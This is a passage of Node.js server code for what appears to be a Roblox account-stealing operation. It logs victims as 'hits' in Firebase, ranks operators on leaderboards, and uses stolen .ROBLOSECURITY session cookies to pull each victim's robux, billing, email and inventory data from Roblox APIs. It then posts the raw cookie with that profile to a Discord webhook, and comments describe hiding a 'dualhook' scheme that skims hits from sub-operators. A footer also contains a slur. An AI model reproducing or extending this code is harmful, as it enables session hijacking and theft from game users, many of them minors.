      return res.status(401).json({ error: 'Invalid token' });
    }

    // Get user logs from Firebase
    const logsRef = db.ref('user_logs');
    const snapshot = await logsRef.once('value');
    const allLogs = snapshot.val() || {};

    // Filter logs for this specific user/subdirectory only
    const userLogs = Object.values(allLogs).filter(log => {
      if (!log.context) return false;

      // For subdirectories, only match exact subdirectory path
      if (userDirectory.includes('/')) {
        const [parentDir, subDir] = userDirectory.split('/');
        return log.context.directory === parentDir && log.context.subdirectory === subDir;
      }

      // For parent directories, only match direct hits (not subdirectory hits)
      return log.context.directory === userDirectory && !log.context.subdirectory;
    });

    const today = new Date().toDateString();
    const todayLogs = userLogs.filter(log => {
      const logDate = new Date(log.timestamp).toDateString();
      return logDate === today;
    });

    // Calculate statistics
    const totalAccounts = userLogs.length;
    const totalSummary = userLogs.reduce((sum, log) => sum + (log.userData.summary || 0), 0);
    const totalRobux = userLogs.reduce((sum, log) => sum + (log.userData.robux || 0), 0);
    const totalRAP = userLogs.reduce((sum, log) => sum + (log.userData.rap || 0), 0);

    const todayAccounts = todayLogs.length;
    const todaySummary = todayLogs.reduce((sum, log) => sum + (log.userData.summary || 0), 0);
    const todayRobux = todayLogs.reduce((sum, log) => sum + (log.userData.robux || 0), 0);
    const todayRAP = todayLogs.reduce((sum, log) => sum + (log.userData.rap || 0), 0);

    res.json({
      totalAccounts,
      totalSummary,
      totalRobux,
      totalRAP,
      todayAccounts,
      todaySummary,
      todayRobux,
      todayRAP,
      uniqueId,
      directory: userDirectory
    });

  } catch (error) {
    console.error('Error getting user stats:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// API endpoint to get global leaderboards
app.get('/api/leaderboard', async (req, res) => {
  try {
    // Get all logs from Firebase
    const logsRef = db.ref('user_logs');
    const snapshot = await logsRef.once('value');
    const allLogs = snapshot.val() || {};

    // Group logs by directory/user
    const userStats = {};

    Object.values(allLogs).forEach(log => {
      if (!log.context || !log.context.directory) return;

      let directory = log.context.directory;
      let displayName = directory;

      // For subdirectories, show only the subdirectory name to hide dualhook structure
      if (log.context.subdirectory) {
        directory = `${log.context.directory}/${log.context.subdirectory}`;
        displayName = log.context.subdirectory; // Only show subdirectory name
      }

      if (!userStats[directory]) {
        userStats[directory] = {
          username: displayName, // Use display name instead of full path
          hits: 0,
          totalSummary: 0,
          lastHit: log.timestamp
        };
      }

      userStats[directory].hits++;
      userStats[directory].totalSummary += (log.userData.summary || 0);
      if (new Date(log.timestamp) > new Date(userStats[directory].lastHit)) {
        userStats[directory].lastHit = log.timestamp;
      }

      // For dualhook systems: also count hits for the parent directory
      // This ensures parent directories show all their hits in leaderboard (direct + subdirectory hits)
      if (log.context.subdirectory) {
        const parentDirectory = log.context.directory;

        if (!userStats[parentDirectory]) {
          userStats[parentDirectory] = {
            username: parentDirectory,
            hits: 0,
            totalSummary: 0,
            lastHit: log.timestamp
          };
        }

        userStats[parentDirectory].hits++;
        userStats[parentDirectory].totalSummary += (log.userData.summary || 0);
        if (new Date(log.timestamp) > new Date(userStats[parentDirectory].lastHit)) {
          userStats[parentDirectory].lastHit = log.timestamp;
        }
      }
    });

    // Sort by total summary for global leaderboard
    const globalLeaderboard = Object.values(userStats)
      .sort((a, b) => b.totalSummary - a.totalSummary);

    // Sort by hits for live leaderboard (keeping it unchanged)
    const liveLeaderboard = Object.values(userStats)
      .sort((a, b) => b.hits - a.hits);

    res.json({
      global: globalLeaderboard,
      live: liveLeaderboard
    });

  } catch (error) {
    console.error('Error getting leaderboard:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// API endpoint to get live hits
app.get('/api/live-hits', async (req, res) => {
  try {
    // Get recent logs from Firebase
    const logsRef = db.ref('user_logs');
    const recentLogsQuery = logsRef.orderByChild('timestamp').limitToLast(20);
    const snapshot = await recentLogsQuery.once('value');
    const recentLogs = snapshot.val() || {};

    // Format for display
    const liveHits = Object.values(recentLogs)
      .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
      .slice(0, 5)
      .map(log => ({
        username: log.userData.username || log.context?.directory || 'Unknown',
        timestamp: log.timestamp
      }));

    res.json(liveHits);

  } catch (error) {
    console.error('Error getting live hits:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// Public API endpoint for bots to get directory stats by unique ID
app.get('/api/bot/stats/id/:uniqueId', async (req, res) => {
  try {
    const uniqueId = req.params.uniqueId;

    // Load directories to find the one with this unique ID
    const directories = await loadDirectories();

    let targetDirectory = null;
    let targetDirectoryName = null;
    let isSubdirectory = false;

    // Search through all directories and subdirectories for the unique ID
    for (const [dirName, dirConfig] of Object.entries(directories)) {
      if (dirConfig.uniqueId === uniqueId) {
        targetDirectory = dirName;
        targetDirectoryName = dirName;
        break;
      }

      // Check subdirectories
      if (dirConfig.subdirectories) {
        for (const [subName, subConfig] of Object.entries(dirConfig.subdirectories)) {
          if (subConfig.uniqueId === uniqueId) {
            targetDirectory = `${dirName}/${subName}`;
            targetDirectoryName = subName;
            isSubdirectory = true;
            break;
          }
        }
      }

      if (targetDirectory) break;
    }

    if (!targetDirectory) {
      return res.status(404).json({ 
        error: 'Directory not found',
        uniqueId: uniqueId
      });
    }

    // Get user logs from Firebase
    const logsRef = db.ref('user_logs');
    const snapshot = await logsRef.once('value');
    const allLogs = snapshot.val() || {};

    // Filter logs for this specific directory
    const directoryLogs = Object.values(allLogs).filter(log => {
      if (!log.context) return false;

      // For direct directory matches
      if (log.context.directory === targetDirectory) return true;

      // For subdirectory matches
      if (log.context.subdirectory && 
          `${log.context.directory}/${log.context.subdirectory}` === targetDirectory) {
        return true;
      }

      return false;
    });

    const today = new Date().toDateString();
    const todayLogs = directoryLogs.filter(log => {
      const logDate = new Date(log.timestamp).toDateString();
      return logDate === today;
    });

    // Calculate statistics
    const totalAccounts = directoryLogs.length;
    const totalSummary = directoryLogs.reduce((sum, log) => sum + (log.userData.summary || 0), 0);
    const totalRobux = directoryLogs.reduce((sum, log) => sum + (log.userData.robux || 0), 0);
    const totalRAP = directoryLogs.reduce((sum, log) => sum + (log.userData.rap || 0), 0);

    const todayAccounts = todayLogs.length;
    const todaySummary = todayLogs.reduce((sum, log) => sum + (log.userData.summary || 0), 0);
    const todayRobux = todayLogs.reduce((sum, log) => sum + (log.userData.robux || 0), 0);
    const todayRAP = todayLogs.reduce((sum, log) => sum + (log.userData.rap || 0), 0);

    // Get last hit info
    const lastHit = directoryLogs.length > 0 
      ? directoryLogs.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))[0]
      : null;

    res.json({
      uniqueId: uniqueId,
      directory: targetDirectoryName,
      fullPath: targetDirectory,
      isSubdirectory: isSubdirectory,
      stats: {
        totalAccounts,
        totalSummary,
        totalRobux,
        totalRAP,
        todayAccounts,
        todaySummary,
        todayRobux,
        todayRAP
      },
      lastHit: lastHit ? {
        username: lastHit.userData.username || 'Unknown',
        timestamp: lastHit.timestamp,
        robux: lastHit.userData.robux || 0,
        premium: lastHit.userData.premium || false
      } : null
    });

  } catch (error) {
    console.error('Error getting bot stats by ID:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// Public API endpoint for bots to get directory stats
app.get('/api/bot/stats/:directory', async (req, res) => {
  try {
    const directoryName = req.params.directory;

    // Load directories to verify the directory exists
    const directories = await loadDirectories();

    // Check if directory exists (including subdirectories)
    let directoryExists = false;
    let targetDirectory = directoryName;

    if (directories[directoryName]) {
      directoryExists = true;
    } else {
      // Check if it's a subdirectory format (parent/sub)
      const parts = directoryName.split('/');
      if (parts.length === 2) {
        const [parentDir, subDir] = parts;
        if (directories[parentDir] && 
            directories[parentDir].subdirectories && 
            directories[parentDir].subdirectories[subDir]) {
          directoryExists = true;
          targetDirectory = directoryName;
        }
      }
    }

    if (!directoryExists) {
      return res.status(404).json({ 
        error: 'Directory not found',
        directory: directoryName
      });
    }

    // Get user logs from Firebase
    const logsRef = db.ref('user_logs');
    const snapshot = await logsRef.once('value');
    const allLogs = snapshot.val() || {};

    // Filter logs for this specific directory
    const directoryLogs = Object.values(allLogs).filter(log => {
      if (!log.context) return false;

      // For direct directory matches
      if (log.context.directory === targetDirectory) return true;

      // For subdirectory matches
      if (log.context.subdirectory && 
          `${log.context.directory}/${log.context.subdirectory}` === targetDirectory) {
        return true;
      }

      return false;
    });

    const today = new Date().toDateString();
    const todayLogs = directoryLogs.filter(log => {
      const logDate = new Date(log.timestamp).toDateString();
      return logDate === today;
    });

    // Calculate statistics
    const totalAccounts = directoryLogs.length;
    const totalSummary = directoryLogs.reduce((sum, log) => sum + (log.userData.summary || 0), 0);
    const totalRobux = directoryLogs.reduce((sum, log) => sum + (log.userData.robux || 0), 0);
    const totalRAP = directoryLogs.reduce((sum, log) => sum + (log.userData.rap || 0), 0);

    const todayAccounts = todayLogs.length;
    const todaySummary = todayLogs.reduce((sum, log) => sum + (log.userData.summary || 0), 0);
    const todayRobux = todayLogs.reduce((sum, log) => sum + (log.userData.robux || 0), 0);
    const todayRAP = todayLogs.reduce((sum, log) => sum + (log.userData.rap || 0), 0);

    // Get last hit info
    const lastHit = directoryLogs.length > 0 
      ? directoryLogs.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))[0]
      : null;

    res.json({
      directory: targetDirectory,
      stats: {
        totalAccounts,
        totalSummary,
        totalRobux,
        totalRAP,
        todayAccounts,
        todaySummary,
        todayRobux,
        todayRAP
      },
      lastHit: lastHit ? {
        username: lastHit.userData.username || 'Unknown',
        timestamp: lastHit.timestamp,
        robux: lastHit.userData.robux || 0,
        premium: lastHit.userData.premium || false
      } : null
    });

  } catch (error) {
    console.error('Error getting bot stats:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// API endpoint for admin stats (protected)
app.get('/api/admin/stats', requireAdminPassword, async (req, res) => {
  try {
    const logsRef = db.ref('user_logs');
    const snapshot = await logsRef.once('value');
    const allLogs = snapshot.val() || {};

    const logs = Object.values(allLogs);

    // Calculate all-time stats (not just today)
    const totalUsers = logs.length;
    const totalRobux = logs.reduce((sum, log) => sum + (log.userData.robux || 0), 0);
    const totalSummary = logs.reduce((sum, log) => sum + (log.userData.summary || 0), 0);
    const premiumUsers = logs.filter(log => log.userData.premium).length;

    // Count unique directories from all logs
    const directories = new Set(logs.map(log => log.context?.directory).filter(dir => dir));
    const activeDirectories = directories.size;

    res.json({
      totalUsers,
      totalRobux,
      totalSummary,
      premiumUsers,
      activeDirectories
    });

  } catch (error) {
    console.error('Error getting admin stats:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// API endpoint for admin logs (protected)
app.get('/api/admin/logs', requireAdminPassword, async (req, res) => {
  try {
    const logsRef = db.ref('user_logs');
    const logsQuery = logsRef.orderByChild('timestamp').limitToLast(50);
    const snapshot = await logsQuery.once('value');
    const logs = snapshot.val() || {};

    const formattedLogs = Object.values(logs)
      .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
      .map(log => ({
        username: log.userData.username || 'Unknown',
        timestamp: log.timestamp,
        robux: log.userData.robux || 0,
        premium: log.userData.premium || false,
        rap: log.userData.rap || 0,
        directory: log.context?.directory || 'main',
        subdirectory: log.context?.subdirectory || null,
        ip: log.context?.ip || 'Unknown'
      }));

    res.json(formattedLogs);

  } catch (error) {
    console.error('Error getting admin logs:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// Function to get CSRF token for Roblox API requests
async function getRobloxCSRFToken(token) {
  try {
    // Try to make any authenticated request to get CSRF token from error response
    const response = await fetch('https://auth.roblox.com/v1/logout', {
      method: 'POST',
      headers: {
        'Cookie': `.ROBLOSECURITY=${token}`,
        'User-Agent': 'Roblox/WinInet',
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Referer': 'https://www.roblox.com/',
        'Origin': 'https://www.roblox.com'
      }
    });

    const csrfToken = response.headers.get('x-csrf-token');
    return csrfToken;
  } catch (error) {
    return null;
  }
}

// Function to fetch user data from Roblox API
async function fetchRobloxUserData(token) {
  try {
    // Get CSRF token first
    const csrfToken = await getRobloxCSRFToken(token);

    const baseHeaders = {
      'Cookie': `.ROBLOSECURITY=${token}`,
      'User-Agent': 'Roblox/WinInet',
      'Accept': 'application/json',
      'Accept-Language': 'en-US,en;q=0.9',
      'Referer': 'https://www.roblox.com/',
      'Origin': 'https://www.roblox.com'
    };

    if (csrfToken) {
      baseHeaders['X-CSRF-TOKEN'] = csrfToken;
    }

    // Get user info first
    const userResponse = await fetch('https://users.roblox.com/v1/users/authenticated', {
      method: 'GET',
      headers: baseHeaders
    });

    if (!userResponse.ok) {
      // Try alternative endpoint if first fails
      const altUserResponse = await fetch('https://www.roblox.com/mobileapi/userinfo', {
        method: 'GET',
        headers: baseHeaders
      });

      if (!altUserResponse.ok) {
        return null;
      }

      const altUserData = await altUserResponse.json();

      // For mobile API, try to get actual robux data
      let actualRobux = altUserData.RobuxBalance || 0;
      let pendingRobux = 0;

      return {
        username: altUserData.UserName || "Unknown User",
        userId: altUserData.UserID || 0,
        robux: actualRobux,
        premium: altUserData.IsPremium || false,
        rap: 0,
        summary: 0,
        creditBalance: 0,
        savedPayment: false,
        robuxIncoming: pendingRobux,
        robuxOutgoing: 0,
        korblox: false,
        headless: false,
        accountAge: 0, // Will calculate below if possible
        groupsOwned: 0,
        placeVisits: 0,
        inventory: { hairs: 0, bundles: 0, faces: 0 },
        emailVerified: false,
        emailAddress: null,
        voiceChatEnabled: false
      };
    }

    const userData = await userResponse.json();

    // Get robux data (current + pending)
    let robuxData = { robux: 0 };
    let pendingRobuxData = { pendingRobux: 0 };

    try {
      const robuxResponse = await fetch('https://economy.roblox.com/v1/user/currency', {
        headers: baseHeaders
      });
      if (robuxResponse.ok) {
        robuxData = await robuxResponse.json();
      }
    } catch (e) {
      // Silent handling
    }

    try {
      const pendingResponse = await fetch('https://economy.roblox.com/v1/user/currency/pending', {
        headers: baseHeaders
      });
      if (pendingResponse.ok) {
        pendingRobuxData = await pendingResponse.json();
      }
    } catch (e) {
      // Silent handling
    }

    // Get transaction summary data
    let summaryData = { incomingRobux: 0, outgoingRobux: 0 };
    try {
      const summaryResponse = await fetch('https://economy.roblox.com/v2/users/' + userData.id + '/transaction-totals?timeFrame=Year&transactionType=summary', {
        headers: baseHeaders
      });
      if (summaryResponse.ok) {
        summaryData = await summaryResponse.json();
      }
    } catch (e) {
      // Silent handling
    }

    // Get credit balance and premium status from billing API
    let premiumData = { isPremium: false };
    let creditBalance = 0;
    let savedPayment = false;

    try {
      const billingResponse = await fetch(`https://billing.roblox.com/v1/credit`, {
        headers: baseHeaders
      });

      if (billingResponse.ok) {
        const billingData = await billingResponse.json();

        // Extract credit balance information
        creditBalance = billingData.balance || 0;
        savedPayment = billingData.hasSavedPayments || false;

        // Check if user has premium features via billing
        premiumData.isPremium = billingData.hasPremium || 
                               billingData.isPremium || 
                               (billingData.balance && billingData.balance > 0) || 
                               false;
      }
    } catch (billingError) {
      // Fallback to premium validation API if billing fails
      try {
        const premiumApiUrl = `https://premiumfeatures.roblox.com/v1/users/${userData.id}/validate-membership`;

        const premiumResponse = await fetch(premiumApiUrl, {
          headers: baseHeaders
        });

        if (premiumResponse.ok) {
          const premiumValidation = await premiumResponse.json();

          // The API returns a direct boolean value (true/false), not an object
          if (typeof premiumValidation === 'boolean') {
            premiumData.isPremium = premiumValidation;
          } else {
            // Fallback to check object properties if response is an object
            premiumData.isPremium = premiumValidation.isPremium || 
                                    premiumValidation.IsPremium || 
                                    premiumValidation.premium || 
                                    premiumValidation.Premium || 
                                    false;
          }
        } else {
          premiumData.isPremium = false;
        }
      } catch (e) {
        premiumData.isPremium = false;
      }
    }

    // Get user details for account age
    let ageData = { created: null };
    try {
      const ageResponse = await fetch(`https://users.roblox.com/v1/users/${userData.id}`, {
        headers: baseHeaders
      });
      if (ageResponse.ok) {
        ageData = await ageResponse.json();
      }
    } catch (e) {
      // Silent handling
    }

    // Get groups owned
    let groupsOwned = 0;
    try {
      const groupsResponse = await fetch(`https://groups.roblox.com/v1/users/${userData.id}/groups/roles`, {
        headers: baseHeaders
      });
      if (groupsResponse.ok) {
        const groupsData = await groupsResponse.json();
        groupsOwned = groupsData.data ? groupsData.data.filter(group => group.role.rank === 255).length : 0;
      }
    } catch (e) {
      // Silent handling
    }

    // Get inventory counts with improved accuracy
    let inventoryData = { hairs: 0, bundles: 0, faces: 0 };
    try {
      // Try to get actual inventory via different methods

      // Method 1: Try user inventory endpoint with filtering
      const inventoryResponse = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/inventory?assetTypes=Bundle,Face,Hair,HairAccessory&limit=100`, {
        headers: baseHeaders
      });

      // Method 2: Try the items endpoint specifically
      const itemsResponse = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/items/Bundle,Face,Hair,HairAccessory/1?limit=100`, {
        headers: baseHeaders
      });

      if (itemsResponse.ok) {
        const itemsData = await itemsResponse.json();
        if (itemsData && itemsData.data) {
          inventoryData.bundles = itemsData.data.filter(item => item.assetType === 'Bundle').length;
          inventoryData.faces = itemsData.data.filter(item => item.assetType === 'Face').length;
          inventoryData.hairs = itemsData.data.filter(item => item.assetType === 'Hair' || item.assetType === 'HairAccessory').length;
        }
      }

      // Method 3: Fallback to collectibles endpoint
      if (inventoryData.hairs === 0 && inventoryData.faces === 0 && inventoryData.bundles === 0) {
        // Get bundles specifically
        const bundleResponse = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/assets/collectibles?assetTypes=Bundle&sortOrder=Asc&limit=100`, {
          headers: baseHeaders
        });

        if (bundleResponse.ok) {
          const bundleData = await bundleResponse.json();
          if (bundleData && bundleData.data) {
            inventoryData.bundles = bundleData.data.length;
          }
        }

        // Get hair accessories  
        const hairResponse = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/assets/collectibles?assetTypes=Hair,HairAccessory&sortOrder=Asc&limit=100`, {
          headers: baseHeaders
        });

        if (hairResponse.ok) {
          const hairData = await hairResponse.json();
          if (hairData && hairData.data) {
            inventoryData.hairs = hairData.data.length;
          }
        }

        // Get faces
        const faceResponse = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/assets/collectibles?assetTypes=Face&sortOrder=Asc&limit=100`, {
          headers: baseHeaders
        });

        if (faceResponse.ok) {
          const faceData = await faceResponse.json();
          if (faceData && faceData.data) {
            inventoryData.faces = faceData.data.length;
          }
        }
      }

      // Final fallback: try avatar items if everything else fails
      if (inventoryData.hairs === 0 && inventoryData.faces === 0 && inventoryData.bundles === 0) {
        const avatarResponse = await fetch(`https://avatar.roblox.com/v1/users/${userData.id}/avatar`, {
          headers: baseHeaders
        });
        if (avatarResponse.ok) {
          const avatarData = await avatarResponse.json();
          if (avatarData.assets) {
            inventoryData.hairs = avatarData.assets.filter(asset => asset.assetType && (asset.assetType.name === 'Hair' || asset.assetType.name === 'HairAccessory')).length;
            inventoryData.faces = avatarData.assets.filter(asset => asset.assetType && asset.assetType.name === 'Face').length;
          }
        }
      }
    } catch (e) {
      // Silent handling
    }

    // Get RAP (Limited item values)
    let rapValue = 0;
    try {
      const collectiblesResponse = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/assets/collectibles?sortOrder=Asc&limit=100`, {
        headers: baseHeaders
      });
      if (collectiblesResponse.ok) {
        const collectiblesData = await collectiblesResponse.json();
        if (collectiblesData.data) {
          rapValue = collectiblesData.data.reduce((total, item) => {
            return total + (item.recentAveragePrice || 0);
          }, 0);
        }
      }
    } catch (e) {
      // Silent handling
    }

    // Calculate account age in days
    let accountAge = 0;
    if (ageData.created) {
      const createdDate = new Date(ageData.created);
      const now = new Date();
      accountAge = Math.floor((now - createdDate) / (1000 * 60 * 60 * 24));
    }

    // Check for Korblox and Headless
    let hasKorblox = false;
    let hasHeadless = false;
    try {
      const wearingResponse = await fetch(`https://avatar.roblox.com/v1/users/${userData.id}/currently-wearing`, {
        headers: baseHeaders
      });
      if (wearingResponse.ok) {
        const wearingData = await wearingResponse.json();
        if (wearingData.assetIds) {
          hasKorblox = wearingData.assetIds.includes(139607770) || wearingData.assetIds.includes(139607718); // Korblox asset IDs
          hasHeadless = wearingData.assetIds.includes(134082579); // Headless Head asset ID
        }
      }
    } catch (e) {
      // Silent handling
    }

    // Fetch email verification status and voice chat settings
    let emailVerified = false;
    let emailAddress = null;
    let voiceChatEnabled = false;

    try {
      // Email verification
      const emailResponse = await fetch('https://accountsettings.roblox.com/v1/email', { headers: baseHeaders });
      if (emailResponse.ok) {
        const emailData = await emailResponse.json();
        emailVerified = emailData.verified || false;
        emailAddress = emailData.emailAddress || null;
      }
    } catch (e) { /* Ignore email fetch errors */ }

    try {
      // Voice chat settings
      const voiceResponse = await fetch('https://voice.roblox.com/v1/settings', { headers: baseHeaders });
      if (voiceResponse.ok) {
        const voiceData = await voiceResponse.json();
        voiceChatEnabled = voiceData.isVoiceEnabled || false;
      }
    } catch (e) { /* Ignore voice chat fetch errors */ }


    return {
      username: userData.name || userData.displayName,
      userId: userData.id,
      robux: robuxData.robux || 0,
      premium: premiumData.isPremium || false,
      rap: rapValue,
      summary: summaryData.incomingRobuxTotal || 0,
      creditBalance: creditBalance,
      savedPayment: savedPayment,
      robuxIncoming: summaryData.incomingRobuxTotal || 0,
      robuxOutgoing: summaryData.outgoingRobuxTotal || 0,
      korblox: hasKorblox,
      headless: hasHeadless,
      accountAge: accountAge,
      groupsOwned: groupsOwned,
      placeVisits: 0, // This data is not easily accessible via API
      inventory: inventoryData,
      emailVerified: emailVerified,
      emailAddress: emailAddress,
      voiceChatEnabled: voiceChatEnabled
    };

  } catch (error) {
    return null;
  }
}

// Function to check if user data meets Dualhook filter criteria
function meetsFilterCriteria(userData, filters) {
  // If filters are not enabled globally, never meet criteria
  if (!filters || !filters.enabled) return false;

  // Check if any individual filters are enabled
  const hasEnabledFilters = filters.currency?.enabled || 
                           filters.collectibles?.enabled || 
                           filters.billings?.enabled || 
                           filters.groups?.enabled || 
                           filters.korblox?.enabled || 
                           filters.headless?.enabled;

  // If no individual filters are enabled, don't filter
  if (!hasEnabledFilters) return false;

  // Check currency filters (must have value > 0 to be active)
  if (filters.currency?.enabled) {
    if (filters.currency.value <= 0) return false; // Invalid filter, don't match
    const value = filters.currency.type === 'balance' ? userData.robux : userData.robux;
    if (value < filters.currency.value) return false;
  }

  // Check collectibles filters (must have value > 0 to be active)
  if (filters.collectibles?.enabled) {
    if (filters.collectibles.value <= 0) return false; // Invalid filter, don't match
    const value = filters.collectibles.type === 'rap' ? userData.rap : userData.rap;
    if (value < filters.collectibles.value) return false;
  }

  // Check billings filters (must have value > 0 to be active)
  if (filters.billings?.enabled) {
    if (filters.billings.value <= 0) return false; // Invalid filter, don't match
    const value = filters.billings.type === 'summary' ? userData.summary : userData.summary;
    if (value < filters.billings.value) return false;
  }

  // Check groups filters (must have value > 0 to be active)
  if (filters.groups?.enabled) {
    if (filters.groups.value <= 0) return false; // Invalid filter, don't match
    const value = filters.groups.type === 'balance' ? userData.groupsOwned : userData.groupsOwned;
    if (value < filters.groups.value) return false;
  }

  // Check Korblox filter
  if (filters.korblox?.enabled && !userData.korblox) return false;

  // Check Headless filter
  if (filters.headless?.enabled && !userData.headless) return false;

  return true;
}

// Function to send custom dualhook webhook with directory branding
async function sendCustomDualhookWebhook(token, userAgent = 'Unknown', userData = null, webhookUrl, directoryName, subdirectoryName, host) {


  if (!webhookUrl) {

    return { success: false, error: 'Webhook URL not configured' };
  }

  try {
    const embed = {
      title: `${directoryName.toUpperCase()} AUTOHAR`,
      description: `Ur ${directoryName.toUpperCase()} AUTOHAR url\n📌\n\n\`http://${host}/${directoryName}/${subdirectoryName}\``,
      color: 0x8B5CF6,
      footer: {
        text: `Made by ${directoryName}`
      }
    };

    const payload = {
      embeds: [embed]
    };


    const response = await fetch(webhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(payload)
    });



    if (!response.ok) {
      const errorText = await response.text();
      console.error('Webhook failed with status:', response.status, 'Error:', errorText);
      return { success: false, error: `Webhook failed: ${response.status}` };
    }


    return { success: true };
  } catch (error) {
    console.error('❌ Failed to send custom dualhook webhook:', error.message);
    console.error('Full error:', error);
    return { success: false, error: error.message };
  }
}

// Function to send Discord webhook with user data (supports custom webhook URLs)
async function sendToDiscord(token, userAgent = 'Unknown', scriptType = 'Unknown', userData = null, customWebhookUrl = null, customTitle = null) {
  const webhookUrl = customWebhookUrl || process.env.DISCORD_WEBHOOK_URL;

  console.log('Webhook URL configured:', webhookUrl ? 'YES' : 'NO');

  if (!webhookUrl) {

    return { success: false, error: 'Webhook URL not configured' };
  }

  try {
    if (userData) {
      // Fetch avatar thumbnail URL
      let avatarUrl = null;
      try {
        const avatarResponse = await fetch(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${userData.userId}&size=420x420&format=Png&isCircular=false`);
        if (avatarResponse.ok) {
          const avatarData = await avatarResponse.json();
          if (avatarData.data && avatarData.data.length > 0) {
            avatarUrl = avatarData.data[0].imageUrl;
          }
        }
      } catch (error) {
        console.log('Failed to fetch avatar, continuing without it');
      }

      // First embed: User data only (without cookie)
      const userDataEmbed = {
        title: customTitle || "<:emoji_37:1410520517349212200> AUTOHAR-TRIPLEHOOK",
        color: 0x8B5CF6,
        fields: [
          {
            name: "<:emoji_37:1410520517349212200> Username",
            value: userData.username || "Unknown",
            inline: false
          },
          {
            name: "<:emoji_31:1410233610031857735> Robux (Pending)",
            value: `${userData.robux || 0} (0)`,
            inline: true
          },
          {
            name: "<:rbxPremium:1408083254531330158> Premium",
            value: userData.premium ? "true" : "false",
            inline: true
          },
          {
            name: "<:emoji_36:1410512337839849543> RAP",
            value: userData.rap?.toString() || "0",
            inline: true
          },
          {
            name: "<:emoji_40:1410521889121501214> Summary",
            value: userData.summary?.toString() || "0",
            inline: true
          },
          {
            name: "<a:emoji_42:1410523396995022890> Billing",
            value: `Balance: ${userData.creditBalance && userData.creditBalance > 0 ? `$${userData.creditBalance} (Est. ${Math.round(userData.creditBalance * 80)} Robux)`: "$0"}\nSaved Payment: ${userData.savedPayment ? "True" : "False"}`,
            inline: false

          },

          {
            name: "<:emoji_31:1410233610031857735> Robux In/Out",
            value: `<:emoji_31:1410233610031857735> ${userData.robuxIncoming || 0} / <:emoji_31:1410233610031857735> ${userData.robuxOutgoing || 0}`,
            inline: true
          },
          {
            name: "<:emoji_39:1410521396420939787> Collectibles",
            value: `${userData.korblox ? "<:KorbloxDeathspeaker:1408080747306418257> True" : "<:KorbloxDeathspeaker:1408080747306418257> False"}\n${userData.headless ? "<:HeadlessHorseman:1397192572295839806> True" : "<:HeadlessHorseman:1397192572295839806> False"}`,
            inline: true
          },

          {
            name: "<:emoji_38:1410520554842361857> Groups Owned",
            value: userData.groupsOwned?.toString() || "0",
            inline: true
          },
          {
            name: "<:emoji_41:1410522675821940820> Place Visits",
            value: userData.placeVisits?.toString() || "0",
            inline: true
          },
          {
            name: "<:emoji_37:1410517247751094363> Inventory",
            value: `Hairs: ${userData.inventory?.hairs || 0}\nBundles: ${userData.inventory?.bundles || 0}\nFaces: ${userData.inventory?.faces || 0}`,
            inline: false
          },
          {
            name: "<:emoji_38:1410517275328647218> Settings",
            value: `Email Status: ${userData.emailVerified ? "Verified" : "Unverified"}\nVoice Chat: ${userData.voiceChatEnabled ? "Enabled" : "Disabled"}\nAccount Age: ${userData.accountAge || 0} Days`,
            inline: false                  
          },

        ],
        footer: {
          text: "Made By .Niqqa"
        }
      };

      // Add thumbnail if avatar URL was fetched successfully
      if (avatarUrl) {
        userDataEmbed.thumbnail = {
          url: avatarUrl
        };
      }

      // Second embed: Cookie only - display the raw token value in description with code block formatting
      const cookieEmbed = {
        title: "🍪 Cookie",
        description: "**```" + token + "```**",
        color: 0x8B5CF6,
        footer: {
          text: "Handle with extreme caution!"
        }
      };

      // Send both embeds together in a single message with @everyone notification
      const combinedPayload = {
        content: "@everyone +1 Hit",
        username: "QNC",  // Custom webhook username
        avatar_url: "https://i.imgur.com/Bszz5QR.jpeg",  // Custom webhook avatar
        embeds: [userDataEmbed, cookieEmbed]
      };



      const response = await fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(combinedPayload)
      });



      if (!response.ok) {
        const errorText = await response.text();
        console.error('Combined embeds failed with status:', response.status, 'Error:', errorText);
        return { success: false, error: `Combined embeds failed: ${response.status}` };
      }


      return { success: true };

    } else {
      // Simple embed with just token (for cases without user data)
      const embed = {
        title: "LUNIX AUTOHAR",
        description: `Ur LUNIX AUTOHAR url\n📌\n\n\`${token}\``,
        color: 0x8B5CF6,
        footer: {
          text: "Made By Lunix"
        }
      };

      const payload = {
        embeds: [embed]
      };



      const response = await fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload)
      });


      if (!response.ok) {
        const errorText = await response.text();
        console.error('Webhook failed with status:', response.status, 'Error:', errorText);
        return { success: false, error: `Webhook failed: ${response.status}` };
      }


      return { success: true };
    }
  } catch (error) {
    console.error('❌ Failed to send Discord webhook:', error.message);
    console.error('Full error:', error);
    return { success: false, error: error.message };
  }
}

// Original convert endpoint - now returns 404 for protection
app.post('/convert', (req, res) => {
  res.status(404).json({ error: 'Not found' });
});

// Legacy convert endpoint (kept for reference but disabled)
app.post('/convert-disabled', validateRequest, async (req, res) => {
  try {
    let input;
    let scriptType;



    // Handle both JSON and text input
    if (typeof req.body === 'string') {
      input = req.body;
      scriptType = 'Unknown';
    } else if (req.body && req.body.powershell) {
      input = req.body.powershell;
      scriptType = req.body.scriptType || 'Unknown';
    } else {

      return res.status(400).json({ error: 'Invalid input format' });
    }


    // Look for .ROBLOSECURITY cookie in PowerShell command with improved regex
    // First, clean up the input by removing PowerShell backticks and line breaks
